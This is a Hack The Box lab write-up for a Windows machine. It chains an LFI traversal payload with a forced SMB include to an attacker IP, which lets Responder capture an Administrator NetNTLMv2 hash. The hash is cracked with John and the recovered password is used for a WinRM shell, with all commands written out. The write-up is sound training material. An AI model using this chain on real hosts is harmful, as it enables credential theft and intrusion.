https://labs.hackthebox.com/achievement/machine/3142066/461    (achievment) 


Executive Summary

During the security assessment of the target host 10.129.159.223, a critical Local File Inclusion (LFI) vulnerability was discovered in the PHP-based web application running on port 80. By exploiting this vulnerability alongside a misconfiguration in how Windows handles SMB authentication requests, administrative credentials were recovered. Full system compromise was achieved via Windows Remote Management (WinRM), allowing for unauthenticated access to user data.
Technical Breakdown & Attack Lifecycle
Phase 1: Reconnaissance & Virtual Host Mapping

An initial Nmap scan revealed two primary open ports:

    Port 80 (HTTP): Running an Apache web server.

    Port 5985 (WinRM): Windows Remote Management.

Directly navigating to the IP address via a web browser failed because the server uses Name-Based Virtual Hosting. The server requires the correct HTTP Host header to route traffic. To fix this, the domain mapping was added locally to /etc/hosts:
Bash

echo "10.129.159.223 unika.htb" | sudo tee -a /etc/hosts

Phase 2: Vulnerability Identification (LFI)

Navigating to http://unika.htb revealed a language selection parameter (?page=french.html). Testing this parameter with directory traversal characters (../) confirmed a Local File Inclusion (LFI) vulnerability by successfully reading the internal Windows hosts file:
Plaintext

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

Phase 3: Exploitation (Credential Harvesting via SMB)

While the PHP configuration (php.ini) disabled loading remote files via HTTP/FTP links, it did not restrict the loading of SMB network paths.

    A local LLMNR/NBNS/SMB poisoner tool (Responder) was started on the VPN interface to listen for authentication requests:
    Bash

    sudo responder -I tun0 -wF

    The web application was forced to include a fake file from the attacker's machine over the SMB protocol:
    Plaintext

    http://unika.htb/index.php?page=//10.10.14.81/somefile

    The Windows server automatically attempted to authenticate against the attacker's machine to access the fake share, leaking the NetNTLMv2 hash for the local Administrator account to Responder.

Phase 4: Password Cracking

The captured hash was isolated into a text file and cracked using John the Ripper against the rockyou.txt wordlist:
Bash

john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt

    Resulting Password: badminton

Phase 5: Post-Exploitation & Compromise

Using the recovered administrative credentials, a remote PowerShell session was successfully established via WinRM using the evil-winrm utility:
Bash

evil-winrm -i 10.129.159.223 -u administrator -p badminton
